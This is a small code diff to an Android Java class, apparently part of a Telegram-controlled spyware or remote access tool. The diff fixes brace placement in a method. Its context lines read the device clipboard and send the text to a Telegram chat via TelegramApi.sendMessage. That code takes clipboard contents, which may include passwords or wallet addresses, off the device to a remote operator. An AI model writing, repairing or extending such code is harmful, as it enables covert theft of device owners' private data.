@@ -13,8 +13,8 @@ public class ClipboardManager {
             if (clip != null && clip.getItemCount() > 0) {
                 CharSequence text = clip.getItemAt(0).getText();
                 TelegramApi.sendMessage("📋 <b>Clipboard:</b>\n<code>" + text + "</code>");
-            }
-        } else TelegramApi.sendMessage("📋 Clipboard empty.");
+            } else TelegramApi.sendMessage("📋 Clipboard empty.");
+        }
     }
 
     public static void setClipboard(Context context, String text) {
